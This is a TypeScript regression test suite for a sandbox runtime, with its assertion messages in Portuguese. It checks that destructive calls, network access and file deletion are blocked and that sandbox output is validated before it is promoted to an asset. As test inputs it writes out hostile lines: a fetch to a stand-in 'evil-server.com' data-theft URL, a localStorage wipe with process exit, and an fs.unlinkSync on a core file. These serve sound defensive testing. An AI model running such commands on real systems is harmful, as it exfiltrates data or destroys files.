import { sandboxRuntime } from "./sandbox-runtime";
import { artifactService } from "../artifacts/artifact-service";

async function runSandboxRegressionTests() {
  console.log("\n===============================================================");
  console.log("  VARYNTH SANDBOX REGRESSION SUITE (SANDBOX-REG-001..008)      ");
  console.log("===============================================================\n");

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, desc: string) {
    if (condition) {
      console.log(`  ✅ PASS: ${desc}`);
      passed++;
    } else {
      console.log(`  ❌ FAIL: ${desc}`);
      failed++;
    }
  }

  // SANDBOX-REG-001: Sandbox cannot access Core (prohibited keywords blocked)
  const coreAttack = await sandboxRuntime.executeCodeInSandbox(
    "localStorage.clear(); process.exit(1);",
    "javascript",
    "ATHENA"
  );
  assert(coreAttack.status === "ERROR", "SANDBOX-REG-001: Tentativa de acesso destrutivo ao host é bloqueada");
  assert(coreAttack.error !== undefined && (coreAttack.error.includes("Core Sovereign Rule") || coreAttack.error.includes("recursos restritos")), "SANDBOX-REG-001: Diagnóstico de violação de isolamento emitido");

  // SANDBOX-REG-002: Sandbox filesystem is scoped
  const caps = sandboxRuntime.getCapabilities();
  assert(caps.filesystem === "SCOPED", "SANDBOX-REG-002: Sandbox opera com filesystem SCOPED");

  // SANDBOX-REG-003: Network denied by default
  const networkAttack = await sandboxRuntime.executeCodeInSandbox(
    "fetch('https://evil-server.com/steal-data');",
    "javascript",
    "ATHENA"
  );
  assert(networkAttack.status === "ERROR", "SANDBOX-REG-003: Tentativa de acesso à rede bloqueada por padrão (network = DENY)");

  // SANDBOX-REG-004: Safe execution completes deterministically
  const safeCode = await sandboxRuntime.executeCodeInSandbox(
    "function solve() { return 42; } solve();",
    "typescript",
    "ATHENA"
  );
  assert(safeCode.status === "SUCCESS", "SANDBOX-REG-004: Código seguro executado com sucesso na Sandbox");
  assert(safeCode.output !== undefined && safeCode.output.includes("Execution OK"), "SANDBOX-REG-004: Saída segura capturada");

  // SANDBOX-REG-005 & 007: Failed execution preserves artifact in DRAFT without corruption
  const draftArt = await artifactService.createArtifact(
    {
      type: "CODE",
      name: "Algoritmo Quântico",
      description: "Teste na sandbox",
    },
    "USER"
  );
  const failedExec = await sandboxRuntime.executeCodeInSandbox(
    "require('fs').unlinkSync('core.ts')",
    "typescript",
    "ATHENA"
  );
  assert(failedExec.status === "ERROR", "SANDBOX-REG-005: Execução maliciosa falhou");
  const untouchedArt = artifactService.getById(draftArt.artifact!.id);
  assert(untouchedArt?.status === "DRAFT", "SANDBOX-REG-007: Falha de sandbox não corrompe nem altera status do artefato");

  // SANDBOX-REG-006: Sandbox output requires validation before promotion to official asset
  const run = sandboxRuntime.createSandboxRun("job-123", draftArt.artifact!.id);
  const promoRes = await sandboxRuntime.promoteSandboxOutput(run.id, draftArt.artifact!.id, {
    name: "compilado.wasm",
    mimeType: "application/wasm",
    content: "mock-wasm-binary-stream",
  });
  assert(promoRes.success === true && !!promoRes.assetId, "SANDBOX-REG-006: Output da Sandbox promovido a asset físico oficial");
  const artWithAsset = artifactService.getById(draftArt.artifact!.id);
  assert(artWithAsset !== undefined && artWithAsset.assetFileIds.includes(promoRes.assetId!), "SANDBOX-REG-006: Asset vinculado ao artefato");

  // SANDBOX-REG-008: Sandbox cannot escalate permissions
  assert(caps.network === "DENY" && caps.processExecution === true, "SANDBOX-REG-008: Perfil de capabilities restritivo mantido sem escalonamento");

  console.log("\n===============================================================");
  console.log(`  RESULTADO: ${passed} Aprovados, ${failed} Falhas`);
  console.log("===============================================================\n");

  if (failed > 0) {
    process.exit(1);
  }
}

runSandboxRegressionTests().catch((err) => {
  console.error("Erro fatal na suíte de sandbox:", err);
  process.exit(1);
});

